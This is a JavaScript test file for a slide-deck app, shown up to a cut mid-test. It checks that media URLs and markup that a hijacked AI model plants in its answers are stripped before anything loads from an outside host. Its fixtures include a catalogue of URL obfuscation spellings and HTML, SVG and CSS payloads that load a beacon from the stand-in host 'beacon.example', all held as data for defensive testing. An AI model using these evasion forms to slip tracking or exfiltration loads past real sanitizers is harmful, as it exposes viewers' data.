/**
 * A model's answer loads nothing in a viewer's browser that it wrote itself
 * (DY-811).
 *
 * An image field, a slide background, an embed and a video load without a
 * click. `fetch` answers here as a model that plants a URL of its own in each
 * of them, on every path that turns an answer into slide content. No path may
 * hand that URL back or store it; what the slides already held stays.
 *
 * The model plants each URL in more than one spelling: as written, behind
 * white space JavaScript trims and the URL parser keeps (U+00A0, U+FEFF,
 * U+3000, U+2028), wrapped in an array, and under a legacy key the read
 * funnel folds into a media field (`bgImage`). A second set of tests renders
 * every media field of every type with every such form, and every legacy key
 * a step of `SCHEMA_MIGRATIONS` moves into a media field, and resolves what a
 * browser would fetch: string checks on an answer miss what the renderer and
 * the funnel make of it.
 *
 * Two loads are not a media field (DY-863), and the planted set carries both
 * onto every path that can reach them: markup in a text a type from the
 * database renders as markup (and a text it writes into an attribute), and a
 * bare video id with a Bunny library of the model's own (`ai: false`). The
 * conversion path offers no type from the database, so it carries only the
 * backgrounds.
 *
 * The list of paths is closed against the transport: a new file that imports
 * it fails the inventory test until it is filed below as a path that writes
 * slide content (with a test) or one that does not.
 *
 * Run with: node --test tests/ai-model-media.test.js
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import { readdirSync, readFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { Readable } from 'node:stream';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';
import { userIdFor, userRows } from './helpers/identity-fixtures.js';
import { brandSeedRow } from './helpers/theme-seed.js';
import { createMockReq, createMockRes } from './helpers/http-mocks.js';

process.env.DEFAULT_ORGANIZATION_ID ||= '00000000-0000-0000-0000-0000000000aa';
delete process.env.SANDBOX_MODE;
delete process.env.DEMO_MODE;
for (const key of Object.keys(process.env)) {
  if (key.startsWith('IMAGEKIT_')) delete process.env[key];
}
process.env.LLM_VENDOR = 'openai';
process.env.OPENAI_API = 'test-key';
process.env.OPENAI_MODEL = 'test-model';
process.env.AI_ENABLED = 'true';

const REPO_ROOT = fileURLToPath(new URL('..', import.meta.url));
const ORG = process.env.DEFAULT_ORGANIZATION_ID;
const OWNER = 'owner@example.com';
const AUTHED = { id: userIdFor(OWNER), email: OWNER, organizationId: ORG };

/** What the model plants: every one names this host. */
const HOST = 'beacon.example';
const IMAGE = `https://${HOST}/pixel.png?d=deck-text`;
const BACKGROUND = `//${HOST}/bg.png?d=deck-text`;
const EMBED = `https://${HOST}/frame?d=deck-text`;
const VIDEO = `https://${HOST}/watch?v=deck-text`;
/** A planted URL with its scheme spelled out, so a form can hide it. */
const withScheme = (url) => (url.startsWith('//') ? `https:${url}` : url);

/**
 * Every spelling a model can hide a URL behind. JavaScript's `trim()` takes
 * the Unicode white space, the URL parser leaves it standing, so a rule that
 * parses the stored value reads a path where the renderer reads a host; an
 * array is a string to `String()`. Most of the rest read as a path on this
 * host as written, and name the planted host only to a sink that repairs the
 * value (strips a character) or writes it where the browser decodes it again
 * (a character reference in an attribute, an escape in CSS). The last seven
 * the URL parser refuses: an attribute loads nothing from them, a CSS `url()`
 * loads them from the planted host anyway (Chrome 152, DY-811 round 3).
 */
const HOSTILE_FORMS = {
  'as written': (url) => url,
  'behind U+00A0': (url) => `\u00a0${url}`,
  'behind U+FEFF': (url) => `\ufeff${url}`,
  'behind U+3000': (url) => `\u3000${url}`,
  'behind U+2028': (url) => `\u2028${url}`,
  'behind U+2029 and a space': (url) => `\u2029 ${url}`,
  'in an array': (url) => [url],
  'in a nested array': (url) => [[url]],
  'a double quote in the scheme': (url) => withScheme(url).replace(/^h/, 'h"'),
  'an apostrophe in the scheme': (url) => withScheme(url).replace(/^h/, "h'"),
  'a backslash in the scheme': (url) => withScheme(url).replace(/^h/, 'h\\'),
  'a parenthesis before': (url) => `(${url}`,
  'in angle brackets': (url) => `<${url}>`,
  'a double quote before': (url) => `"${url}`,
  'a double quote and U+00A0 before': (url) => `"\u00a0${url}`,
  'a line feed in the scheme': (url) => withScheme(url).replace(/^h/, 'h\n'),
  'the colon as &#58;': (url) => withScheme(url).replace(':', '&#58;'),
  'the colon as &colon;': (url) => withScheme(url).replace(':', '&colon;'),
  'the slashes as &sol;&sol;': (url) =>
    withScheme(url).replace(/^[a-z]+:\/\//, '&sol;&sol;'),
  'the slashes as &#x2f;&#x2f;': (url) =>
    withScheme(url).replace(/^[a-z]+:\/\//, '&#x2f;&#x2f;'),
  'the colon as a CSS escape': (url) => withScheme(url).replace(':', '\\3a '),
  'U+FF1A after the host': (url) =>
    withScheme(url).replace(`//${HOST}`, `//${HOST}\uff1a`),
  'U+FE55 after the host': (url) =>
    withScheme(url).replace(`//${HOST}`, `//${HOST}\ufe55`),
  'schemaless, U+FF1A after the host': (url) =>
    withScheme(url).replace(`https://${HOST}`, `//${HOST}\uff1a`),
  'a second colon after the scheme': (url) =>
    withScheme(url).replace('://', ':://'),
  'a colon between the slashes': (url) =>
    withScheme(url).replace('://', ':/:/'),
  'an at sign after the scheme': (url) =>
    withScheme(url).replace('://', ':@//'),
  'an at sign between the slashes': (url) =>
    withScheme(url).replace('://', ':/@/'),
};
const hostile = (name, url) => HOSTILE_FORMS[name](url);

/** The forms the rule reads as a path on this host, so it keeps them. */
const localAsWritten = () =>
  Object.keys(HOSTILE_FORMS).filter((name) => {
    const value = hostile(name, BACKGROUND);
    return typeof value === 'string' && !namesPlantedHost(value);
  });

/** The forms the URL parser refuses on a base: the rule empties them. */
const refusedByTheParser = () =>
  Object.keys(HOSTILE_FORMS).filter((name) => {
    const value = hostile(name, BACKGROUND);
    return typeof value === 'string' && !parsesOnEveryBase(mediaValue(value));
  });

/** What the deck already held: an absolute copy, an embed the author chose. */
const HELD_IMAGE = 'https://bucket.s3.test/uploads/held.png';
const HELD_EMBED = 'https://dashboard.example/board';

/**
 * A type from the database that renders text as markup (DY-863): `body` goes
 * in as it is, `photo` into an attribute, and the template loads a mark of
 * its own from a host the installation chose.
 */
const NOTES_TYPE = 'custom-notes';
const INSTALLATION_MARK = 'https://cdn.installation.test/mark.png';
function notesTypeRow() {
  return {
    id: 'cst-notes',
    organization_id: ORG,
    slug: 'notes',
    label: 'Notes',
    base_type: null,
    fields: [
      { key: 'title', type: 'string', label: 'Title', maxLength: 200 },
      { key: 'body', type: 'string', label: 'Body', maxLength: 4000 },
      { key: 'photo', type: 'string', label: 'Photo', maxLength: 400 },
    ],
    defaults: { title: '', body: '', photo: '' },
    defaults_by_lang: null,
    template:
      '<div class="slide"><h2>{{esc title}}</h2><div class="body">{{raw body}}</div>' +
      '{{#if photo}}<img src="{{esc photo}}" alt="">{{/if}}' +
      `<img class="mark" src="${INSTALLATION_MARK}" alt=""></div>`,
    css: null,
    usage: null,
    is_published: true,
    sort_order: 0,
    created_at: '2026-11-06T00:00:00.000Z',
    updated_at: '2026-11-06T00:00:00.000Z',
    created_by: null,
  };
}

/** Markup a model writes in a text the type renders as markup. */
const PLANTED_MARKUP = `<p>Seen this year.</p><img src="${IMAGE}" alt="">`;
/** A Bunny library the installation did not choose, for a bare video id. */
const PLANTED_LIBRARY = 'planted-library';

const { createFakeDb } = await import('./helpers/fake-db.js');
const { __setTestDb } = await import('../server/db/client.js');
const { initializeStorage } = await import('../server/db/lifecycle.js');
const { createStorageScope } = await import('../server/utils/context.js');
const { initializeMediaProvider } = await import('../server/media/index.js');
const { McpServer } = await import('../server/mcp/protocol.js');
const { registerTools } = await import('../server/mcp/tools.js');
const { handleAi } = await import('../server/routes/public-api/v1/ai.js');
const { handleAiAppendSlides } =
  await import('../server/routes/api/ai/append-slides.js');
const { handleAiRefineSection } =
  await import('../server/routes/api/ai/refine-section.js');
const { handleAiIterate } = await import('../server/routes/api/ai/iterate.js');
const { handleAiConvertSlide } =
  await import('../server/routes/api/ai/convert-slide.js');
const { analyzePresentation } =
  await import('../server/utils/ai/analyze-presentation.js');
const { generateDeck } = await import('../server/utils/ai/generate-deck.js');
const { createPresentation } =
  await import('../server/services/presentations.js');
const { dropForeignMedia, leaveOut, loadsFromAnotherHost, heldInSlides } =
  await import('../server/utils/ai/model-media.js');
const { SLIDE_TYPES, canonicalSlideType } =
  await import('../shared/slide-types/registry.js');
const { toRuntimeSlideType } =
  await import('../server/utils/custom-slide-type-runtime.js');
const { loadSurfaces } = await import('../server/utils/ai/model-media.js');
const { loadSlideTypeOffer } =
  await import('../server/utils/org-slide-types.js');

/** Core plus the type from the database, as an org's merged map holds it. */
const TYPES = {
  ...SLIDE_TYPES,
  [NOTES_TYPE]: toRuntimeSlideType({
    ...notesTypeRow(),
    baseType: null,
  }),
};
const { newSlide, renderSlideHtml } =
  await import('../shared/slide-types/presentation.js');
const { mediaValue } = await import('../shared/slide-types/helpers.js');
const { SCHEMA_MIGRATIONS, migratePresentation } =
  await import('../shared/slide-types/schema-version.js');

let db;
let deckId;
let tmpRoot;

test.before(async () => {
  tmpRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'dy811-media-'));
  await initializeMediaProvider(tmpRoot);
  __setTestDb(createFakeDb({ organizations: [{ id: ORG, name: 'Default' }] }));
  await initializeStorage();
});

test.after(async () => {
  __setTestDb(null);
  await fs.rm(tmpRoot, { recursive: true, force: true });
});

function scope() {
  return createStorageScope(AUTHED, { repoRoot: REPO_ROOT });
}

/** The deck every editing path works on: one slide with media of its own. */
const heldSlides = () => [
  {
    type: 'image-text-slide',
    content: { title: 'The barn', body: 'Built this year.', image: HELD_IMAGE },
  },
  { type: 'embed-slide', content: { title: 'Board', embedUrl: HELD_EMBED } },
  { type: 'content-slide', content: { title: 'Plan', body: 'Next year.' } },
];

async function setup() {
  const brand = await brandSeedRow();
  db = createFakeDb({
    organizations: [{ id: ORG, name: 'Default', slug: 'default' }],
    users: userRows(OWNER),
    themes: [brand],
    custom_slide_types: [notesTypeRow()],
    presentations: [],
    api_usage_daily: [],
  });
  __setTestDb(db);
  const deck = await createPresentation(
    scope(),
    { actor: AUTHED },
    { title: 'Existing', theme: brand.id, lang: 'en', slides: heldSlides() },
  );
  deckId = deck.id;
  return deck;
}

const stored = () => db.__tables.presentations.find((d) => d.id === deckId);

/** `fetch` as a model that answers `answer(body)`; any other host is a leak. */
function stubModel(t, answer) {
  const saved = globalThis.fetch;
  t.mock.method(console, 'warn', () => {});
  globalThis.fetch = async (url, init) => {
    assert.ok(!String(url).includes(HOST), `the server fetched ${url}`);
    const content = JSON.stringify(answer(String(init?.body ?? '')));
    return new Response(
      JSON.stringify({ choices: [{ message: { content } }] }),
      { status: 200, headers: { 'Content-Type': 'application/json' } },
    );
  };
  t.after(() => {
    globalThis.fetch = saved;
  });
}

/** The slides a hijacked model writes: its own URL in every field that loads. */
const planted = () => [
  {
    type: 'image-slide',
    content: { title: 'A view', image: IMAGE, alt: 'A view' },
    why: 'A picture.',
  },
  {
    type: 'gallery-slide',
    content: {
      title: 'Two views',
      slideBgImage: BACKGROUND,
      images: [
        { src: IMAGE, alt: 'One' },
        { src: `/\\${HOST}/slash.png`, alt: 'Two' },
      ],
    },
    why: 'A gallery.',
  },
  {
    type: 'embed-slide',
    content: { title: 'A page', embedUrl: EMBED },
    why: 'An embed.',
  },
  {
    type: 'video-slide',
    content: { title: 'A film', source: VIDEO },
    why: 'A video.',
  },
  // The same URLs in the spellings the rule once read differently from the
  // renderer, and under a key the read funnel folds into a media field.
  {
    type: 'image-text-slide',
    content: {
      title: 'Spaced',
      body: 'A picture behind white space.',
      image: hostile('behind U+00A0', IMAGE),
      slideBgImage: hostile('behind U+FEFF', BACKGROUND),
    },
    why: 'White space.',
  },
  {
    type: 'team-cards-slide',
    content: {
      title: 'The team',
      members: [{ name: 'Ann', image: hostile('in an array', IMAGE) }],
    },
    why: 'An array.',
  },
  {
    type: 'logo-wall-slide',
    content: {
      title: 'Partners',
      logos: [{ name: 'Acme', image: hostile('behind U+3000', IMAGE) }],
    },
    why: 'White space.',
  },
  {
    type: 'content-slide',
    content: { title: 'Old key', body: 'A legacy key.', bgImage: IMAGE },
    why: 'A key the funnel folds.',
  },
  {
    type: 'embed-slide',
    content: {
      title: 'A spaced page',
      embedUrl: hostile('behind U+3000', EMBED),
    },
    why: 'White space.',
  },
  {
    type: 'embed-slide',
    content: {
      title: 'A listed page',
      embedUrl: hostile('in an array', EMBED),
    },
    why: 'An array.',
  },
  {
    type: 'video-slide',
    content: {
      title: 'A spaced film',
      source: hostile('behind U+2028', VIDEO),
    },
    why: 'White space.',
  },
  // Beyond the media fields (DY-863): markup in a text a type from the
  // database renders as markup and in an attribute, and a bare video id
  // with a Bunny library of the model's own.
  {
    type: NOTES_TYPE,
    content: { title: 'Notes', body: PLANTED_MARKUP, photo: IMAGE },
    why: 'Markup.',
  },
  {
    type: 'video-slide',
    content: {
      title: 'A library film',
      source: 'a-bare-video-id',
      bunnyLibraryId: PLANTED_LIBRARY,
    },
    why: 'A library.',
  },
  // A background the rule reads as a path on this host: it stays, and must
  // load nothing, because the layer writes what the rule read. And one the
  // URL parser refuses, which a CSS url() loads anyway: it is emptied.
  ...[...localAsWritten(), ...refusedByTheParser()].map((form) => ({
    type: 'content-slide',
    content: {
      title: 'A local-looking background',
      body: form,
      slideBgImage: hostile(form, BACKGROUND),
    },
    why: 'A background.',
  })),
];

/** Whether a planted slide loses what its type requires. */
const losesItsSource = (s) =>
  ['embed-slide', 'video-slide'].includes(s.type) &&
  s.content.source !== 'a-bare-video-id';

/** The planted slides that can be stored once their media is gone. */
const plantedThatStay = () => planted().filter((s) => !losesItsSource(s));

/**
 * No string anywhere in `value` mentions the planted host, except exactly the
 * backgrounds {@link localAsWritten} plants: the rule reads those as a path on
 * this host and keeps them; what they render is checked by
 * {@link assertRendersNothingPlanted}. A URL in a sentence or a warning fails.
 */
function assertNothingPlanted(value, where) {
  const json = JSON.stringify(value);
  assert.ok(json.length > 2, `${where}: nothing came back`);
  const kept = new Set(
    localAsWritten().map((form) => hostile(form, BACKGROUND)),
  );
  const named = [];
  (function walk(v) {
    if (typeof v === 'string') {
      if (v.includes(HOST) && !kept.has(v)) named.push(v);
    } else if (v && typeof v === 'object') {
      for (const inner of Object.values(v)) walk(inner);
    }
  })(value);
  assert.deepEqual(
    named,
    [],
    `${where} holds a URL the model wrote: ${json.slice(0, 1500)}`,
  );
}

/** Two bases, as in the rule: `https:host` is a path under one, a host under the other. */
const PAGE_BASES = ['https://deckyard.invalid/', 'http://deckyard.invalid/'];

const PARSER = new JSDOM('').window.document;

/** Attributes whose value a browser fetches or frames. */
const URL_ATTRIBUTES = [
  'src',
  'srcset',
  'poster',
  'background',
  'data-embed-url',
  'data-src',
];

/** Attributes that load on render except on a link, where they wait for a click. */
const HREF_ATTRIBUTES = ['href', 'xlink:href'];

/**
 * Every address the rendered HTML makes a browser fetch or frame, read the
 * way the browser reads it: the attributes through an HTML parser (so every
 * character reference is decoded; only a `srcset` is a list), and in every
 * `style` attribute and element each `url(...)` and each CSS string with its
 * escapes resolved. A string counts too, because `image-set()` loads one.
 *
 * @returns {{ attributes: string[], css: string[] }}
 */
function addressesIn(html) {
  const template = PARSER.createElement('template');
  template.innerHTML = html;
  const attributes = [];
  const css = [];
  for (const el of template.content.querySelectorAll('*')) {
    for (const name of URL_ATTRIBUTES) {
      const value = el.getAttribute(name);
      if (value == null) continue;
      if (name === 'srcset') {
        attributes.push(
          ...value.split(/,\s+/).map((part) => part.trim().split(/\s+/)[0]),
        );
      } else attributes.push(value);
    }
    if (!['a', 'area'].includes(el.localName)) {
      for (const name of HREF_ATTRIBUTES) {
        const value = el.getAttribute(name);
        if (value != null) attributes.push(value);
      }
    }
    if (el.localName === 'template') {
      const inner = addressesIn(el.innerHTML);
      attributes.push(...inner.attributes);
      css.push(...inner.css);
    }
    const style = el.getAttribute('style');
    if (style) css.push(...cssAddresses(style));
    if (el.localName === 'style') css.push(...cssAddresses(el.textContent));
  }
  return { attributes, css };
}

/**
 * The `url(...)` tokens and strings of a piece of CSS, with escapes resolved
 * as CSS Syntax Level 3 resolves them (preprocessing included: NUL becomes
 * U+FFFD, CR and FF a line feed). A function name may itself be escaped
 * (`\75 rl(`), so idents are decoded before they are compared. Comments are
 * skipped, so an apostrophe in one opens no string.
 */
function cssAddresses(css) {
  const src = css.replace(/\r\n?|\f/g, '\n').replace(/\0/g, '\ufffd');
  const found = [];
  let i = 0;
  const isHex = (c) => /^[0-9a-f]$/i.test(c);
  const escape = () => {
    // At a backslash; returns the decoded code point and moves past it.
    i += 1;
    let hex = '';
    while (hex.length < 6 && isHex(src[i] || '')) hex += src[i++];
    if (hex) {
      if (/[ \t\n]/.test(src[i] || '')) i += 1;
      const cp = parseInt(hex, 16);
      return cp === 0 || cp > 0x10ffff || (cp >= 0xd800 && cp <= 0xdfff)
        ? '\ufffd'
        : String.fromCodePoint(cp);
    }
    return i < src.length ? src[i++] : '\ufffd';
  };
  const string = (quote) => {
    let out = '';
    i += 1;
    while (i < src.length && src[i] !== quote) {
      if (src[i] === '\n') return out; // a bad string; the browser drops it
      if (src[i] === '\\') {
        if (src[i + 1] === '\n') i += 2;
        else out += escape();
      } else out += src[i++];
    }
    i += 1;
    return out;
  };
  while (i < src.length) {
    const c = src[i];
    if (c === '/' && src[i + 1] === '*') {
      const end = src.indexOf('*/', i + 2);
      i = end < 0 ? src.length : end + 2;
    } else if (c === '"' || c === "'") {
      found.push(string(c));
    } else if (/[a-z_\\-]/i.test(c) || c.charCodeAt(0) >= 0x80) {
      let name = '';
      while (i < src.length) {
        if (src[i] === '\\' && src[i + 1] !== '\n') name += escape();
        else if (/[a-z0-9_-]/i.test(src[i]) || src.charCodeAt(i) >= 0x80) {
          name += src[i++];
        } else break;
      }
      if (!name) {
        i += 1; // a backslash before a line feed starts no ident
        continue;
      }
      if (src[i] === '(' && name.toLowerCase() === 'url') {
        i += 1;
        while (/[ \t\n]/.test(src[i] || '')) i += 1;
        if (src[i] === '"' || src[i] === "'") continue; // read as a string
        let out = '';
        while (i < src.length && src[i] !== ')') {
          out += src[i] === '\\' ? escape() : src[i++];
        }
        found.push(out.trim());
      }
    } else i += 1;
  }
  return found;
}

/**
 * Whether the value as every renderer reads it reaches the planted host from
 * a CSS `url()`, the widest sink: the rule has to empty it.
 */
function namesPlantedHost(value) {
  const used = mediaValue(value);
  return Boolean(used) && cssLoadsPlantedHost(used);
}

/** Whether the URL parser takes the address on both page bases. */
function parsesOnEveryBase(address) {
  return PAGE_BASES.every((base) => URL.canParse(address, base));
}

/** Whether an attribute with this address loads from the planted host. */
function resolvesToPlantedHost(address) {
  return PAGE_BASES.some((base) => {
    try {
      return new URL(address, base).host === HOST;
    } catch {
      return false;
    }
  });
}

/**
 * Whether a CSS `url()` or string with this address loads from the planted
 * host. One the URL parser refuses on a base, Chrome still fetches from the
 * host it names, and no parser in Node does what Chrome does there: so every
 * address that does not parse on both bases counts as a load, whether or not
 * it spells the host (the conservative reading; DY-811 review 4).
 */
function cssLoadsPlantedHost(address) {
  return resolvesToPlantedHost(address) || !parsesOnEveryBase(address);
}

/** The addresses in `html` a browser loads from the planted host. */
function plantedLoads(html) {
  const { attributes, css } = addressesIn(html);
  return [
    ...attributes.filter(resolvesToPlantedHost),
    ...css.filter(cssLoadsPlantedHost),
  ];
}

/**
 * Render the slides the way a viewer gets them (a read folds them through the
 * funnel first) and fail on anything that loads from the planted host.
 */
function assertRendersNothingPlanted(slides, where) {
  const deck = migratePresentation({ slides: structuredClone(slides) });
  for (const slide of deck.slides) {
    const loads = plantedLoads(renderSlideHtml(slide, { slideTypes: TYPES }));
    assert.deepEqual(loads, [], `${where}: ${slide.type} loads ${loads}`);
  }
}

/**
 * The image slides came back emptied, so the scrub had work to do; the embed
 * and the video are left out, because neither can be stored without its
 * source, and a slide that stays says so.
 */
function assertPlantedTypes(slides, where) {
  for (const type of ['image-slide', 'gallery-slide']) {
    assert.ok(
      slides.some((s) => s.type === type),
      `${where}: no ${type} came back, so this proves nothing`,
    );
  }
  const image = slides.find((s) => s.type === 'image-slide');
  assert.equal(image.content.image, '', `${where}: the image is emptied`);
  const added = slides.filter((s) => s.content?.title !== 'Board');
  for (const type of ['embed-slide', 'video-slide']) {
    assert.ok(
      !added.some(
        (s) =>
          s.type === type &&
          !mediaValue(s.content.source ?? s.content.embedUrl),
      ),
      `${where}: a ${type} without its source came back`,
    );
  }
  // Beyond the media fields (DY-863).
  const notes = slides.find((s) => s.type === NOTES_TYPE);
  assert.ok(
    notes,
    `${where}: no ${NOTES_TYPE} came back, so this proves nothing`,
  );
  assert.equal(notes.content.title, 'Notes', `${where}: the title stays`);
  const film = slides.find((s) => s.content?.source === 'a-bare-video-id');
  assert.ok(film, `${where}: the library film did not come back`);
  assert.equal(
    film.content.bunnyLibraryId || '',
    '',
    `${where}: the film plays from the installation's library`,
  );
}

/** A slide that stays carries the notice about the ones left out. */
function assertLeftOutNotice(slides, where) {
  assert.ok(
    slides.some((s) =>
      (s._aiWarnings || []).some((w) => /was left out/.test(w)),
    ),
    `${where}: nothing says a slide was left out`,
  );
}

async function callRoute(handler, body) {
  const res = createMockRes();
  await handler({
    repoRoot: REPO_ROOT,
    storageScope: scope(),
    req: createMockReq({ method: 'POST', body }),
    res,
    authedUser: AUTHED,
  });
  const answer = res.json();
  assert.equal(res.statusCode, 200, JSON.stringify(answer));
  return answer;
}

async function callTool(name, args) {
  const server = new McpServer();
  registerTools(server, { defaultOwnerEmail: OWNER });
  return server.tools.get(name).handler(args, {
    ownerEmail: OWNER,
    organizationId: ORG,
    apiKey: { id: 'key-1', tier: 'free', permissions: ['ai', 'write'] },
  });
}

async function callV1(pathname, body) {
  const req = Readable.from([Buffer.from(JSON.stringify(body))]);
  req.method = 'POST';
  req.headers = { 'content-type': 'application/json' };
  const res = {
    body: null,
    setHeader() {},
    writeHead() {},
    end(payload) {
      this.body = payload ? JSON.parse(payload) : null;
    },
    on() {},
    once() {},
    off() {},
    removeListener() {},
  };
  await handleAi({
    req,
    res,
    url: new URL(`http://localhost/api/v1/ai/${pathname}`),
    repoRoot: REPO_ROOT,
    storageScope: {
      repoRoot: REPO_ROOT,
      organizationId: ORG,
      actorEmail: OWNER,
    },
    apiKey: {
      id: 'key-1',
      tier: 'free',
      name: 'Bot',
      ownerEmail: OWNER,
      permissions: ['ai', 'write'],
      organizationId: ORG,
    },
    authedUser: AUTHED,
  });
  return res.body;
}

// ── The rule ────────────────────────────────────────────────────────────────

test('a value is remote when the browser would fetch it from another host', () => {
  for (const remote of [
    IMAGE,
    BACKGROUND,
    `/\\${HOST}/x.png`,
    `\\\\${HOST}/x.png`,
    `https:/${HOST}/x.png`,
    `https:\\\\${HOST}\\x.png`,
    `  https://${HOST}/x.png`,
    `ht\ttps://${HOST}/x.png`,
    `/\t/${HOST}/x.png`,
    `https://installation.invalid@${HOST}/x.png`,
    `http:${HOST}/x.png`,
    `HTTPS://${HOST.toUpperCase()}/x.png`,
    `ftp://${HOST}/x.png`,
    // The URL parser refuses these on a base; a CSS url() loads them anyway.
    `https://${HOST}\uff1a/x.png`,
    `//${HOST}\ufe55/x.png`,
    `https:://${HOST}/x.png`,
    `https:/@/${HOST}/x.png`,
    'https://',
  ]) {
    assert.equal(loadsFromAnotherHost(remote), true, JSON.stringify(remote));
  }
  for (const local of [
    '/uploads/a.png',
    'uploads/a.png',
    './a.png',
    '/assets/images/a.png?v=2',
    'source-image:3',
    'data:image/png;base64,AAAA',
    'blob:abc',
    'a-bare-video-id',
    '',
  ]) {
    assert.equal(loadsFromAnotherHost(local), false, JSON.stringify(local));
  }
});

test('a media field keeps what was held and what names no other host', () => {
  const slides = [
    {
      type: 'image-slide',
      content: { image: '/uploads/own.png', slideBgImage: HELD_IMAGE },
    },
    { type: 'embed-slide', content: { embedUrl: HELD_EMBED } },
    { type: 'embed-slide', content: { embedUrl: EMBED } },
    { type: 'video-slide', content: { source: VIDEO } },
    // A bare id plays from the library the installation configured.
    { type: 'video-slide', content: { source: 'a-bare-video-id' } },
    {
      type: 'gallery-slide',
      content: { images: [{ src: IMAGE }, { src: HELD_IMAGE }] },
    },
  ];
  const keep = heldInSlides(heldSlides(), SLIDE_TYPES);
  assert.deepEqual([...keep.media].sort(), [HELD_EMBED, HELD_IMAGE].sort());
  const unusable = dropForeignMedia(slides, { slideTypes: SLIDE_TYPES, keep });

  // The planted embed and video lost what their type requires; an image
  // slide without its image is still a slide.
  assert.deepEqual([...unusable], [slides[2], slides[3]]);
  assert.deepEqual(
    leaveOut(slides, unusable).map((s) => s.type),
    ['image-slide', 'embed-slide', 'video-slide', 'gallery-slide'],
  );
  assert.match(slides[1]._aiWarnings.at(-1), /was left out/);
  assert.equal(slides[0].content.image, '/uploads/own.png');
  assert.equal(slides[0].content.slideBgImage, HELD_IMAGE);
  assert.equal(slides[1].content.embedUrl, HELD_EMBED);
  assert.equal(slides[2].content.embedUrl, '');
  assert.equal(slides[3].content.source, '');
  assert.equal(slides[4].content.source, 'a-bare-video-id');
  assert.deepEqual(
    slides[5].content.images.map((i) => i.src),
    ['', HELD_IMAGE],
  );
  assert.equal(slides[0]._aiWarnings, undefined);
  assert.match(slides[2]._aiWarnings[0], /embed or video/);
  assert.match(slides[5]._aiWarnings[0], /remote image/);
});

test('a held embed is not a held image: the kinds do not mix up by value', () => {
  // The set holds values; a model that moves an author's embed into an image
  // field loads a URL the deck already loads, and nothing new.
  const slides = [{ type: 'image-slide', content: { image: HELD_EMBED } }];
  dropForeignMedia(slides, {
    slideTypes: SLIDE_TYPES,
    keep: heldInSlides(heldSlides(), SLIDE_TYPES),
  });
  assert.equal(slides[0].content.image, HELD_EMBED);
});

test('a type the map does not know is read as media in every string', () => {
  const slides = [
    {
      type: 'no-such-slide',
      content: { anything: IMAGE, nested: [{ deep: BACKGROUND }], text: 'Hi' },
    },
  ];
  dropForeignMedia(slides, { slideTypes: SLIDE_TYPES });
  assert.deepEqual(slides[0].content, {
    anything: '',
    nested: [{ deep: '' }],
    text: 'Hi',
  });
});

test('a type named by its published id is read off its declaration', () => {
  const published = canonicalSlideType('embed-slide');
  assert.notEqual(published, 'embed-slide', 'the type has a published id');
  const slides = [{ type: published, content: { embedUrl: EMBED } }];
  dropForeignMedia(slides, { slideTypes: SLIDE_TYPES });
  assert.equal(slides[0].content.embedUrl, '');
});

// ── Beyond the media fields (DY-863) ────────────────────────────────────────

/**
 * Every way markup a model writes in a text a template renders as markup can
 * make a viewer's browser load from the planted host, after the sanitizer.
 * Each one the oracle sees unguarded (the test below proves it).
 */
const PLANTED_MARKUP_FORMS = {
  'an image': `<img src="${IMAGE}">`,
  'an image behind a character reference': `<img src="&#x68;ttps://${HOST}/p.png?d=x">`,
  'an image set': `<img srcset="/own.png 1x, ${IMAGE} 2x">`,
  'a picture source': `<picture><source srcset="${IMAGE}"><img src="/own.png"></picture>`,
  'a video poster': `<video poster="${IMAGE}"></video>`,
  'a video source': `<video><source src="${VIDEO}"></video>`,
  'an SVG image': `<svg><image href="${IMAGE}"></image></svg>`,
  'an SVG image by xlink': `<svg><image xlink:href="${IMAGE}"></image></svg>`,
  'an SVG filter image': `<svg><filter id="f"><feImage href="${IMAGE}"></feImage></filter></svg>`,
  'a table background': `<table background="${IMAGE}"><tr><td>x</td></tr></table>`,
  'a style background': `<div style="background-image: url(${IMAGE})">x</div>`,
  'a style background, escaped': `<div style="background-image: u\\72l(${IMAGE})">x</div>`,
  'a style background in capitals': `<div style="background-image: URL(${IMAGE})">x</div>`,
  'a style image set': `<div style="background-image: image-set('${IMAGE}' 1x)">x</div>`,
  'a style background behind a comment': `<div style="background: url/**/(${IMAGE})">x</div>`,
  'an SVG fill': `<svg><rect fill="url(${IMAGE}#p)" width="1" height="1"></rect></svg>`,
  'an embed a runtime frames': `<div class="embed-frame" data-embed-url="${EMBED}"></div>`,
  'a refused CSS address': `<div style="background: url(https://${HOST}：/p.png)">x</div>`,
};

/**
 * Forms the rule refuses without Chrome loading them: a comment between
 * `url` and `(` makes no function, and Chrome resolves an SVG paint server
 * only in its own document. The rule reads CSS conservatively (a comment or
 * an escape counts, and so does any function it does not know), so these go
 * too; Firefox does fetch an external paint server.
 */
const REFUSED_THOUGH_CHROME_LOADS_NOTHING = new Set([
  'a style background behind a comment',
  'an SVG fill',
]);

/** A notes slide with these values, as a model hands it back. */
const notesSlide = (content) => ({
  type: NOTES_TYPE,
  content: { title: 'Notes', body: '', photo: '', ...content },
});

const plantedNotesLoads = (slide) =>
  plantedLoads(renderSlideHtml(slide, { slideTypes: TYPES }));

test('markup a type renders as markup loads nothing a model planted, in any form', () => {
  for (const [form, body] of Object.entries(PLANTED_MARKUP_FORMS)) {
    const unguarded = notesSlide({ body });
    assert.equal(
      plantedNotesLoads(unguarded).length > 0,
      !REFUSED_THOUGH_CHROME_LOADS_NOTHING.has(form),
      `${form}: the render oracle does not see what the slide loads unguarded`,
    );
    const slide = notesSlide({ body });
    dropForeignMedia([slide], { slideTypes: TYPES });
    assert.equal(slide.content.body, '', `${form}: the markup is emptied`);
    assert.equal(slide.content.title, 'Notes', `${form}: the title stays`);
    assert.match(slide._aiWarnings[0], /load something from another host/);
    assert.deepEqual(plantedNotesLoads(slide), [], form);
  }
});

test('a text the template writes into an attribute loads nothing a model planted', () => {
  for (const form of Object.keys(HOSTILE_FORMS)) {
    const photo = hostile(form, IMAGE);
    if (typeof photo !== 'string') continue;
    const slide = notesSlide({ photo });
    dropForeignMedia([slide], { slideTypes: TYPES });
    assert.deepEqual(plantedNotesLoads(slide), [], form);
  }
  const slide = notesSlide({ photo: IMAGE });
  dropForeignMedia([slide], { slideTypes: TYPES });
  assert.equal(slide.content.photo, '');
});

test('markup that loads nothing, a link and what the template loads itself stay', () => {
  const body =
    '<p><strong>Seen</strong> <span style="color: rgb(200, 0, 0)">this year</span>.</p>' +
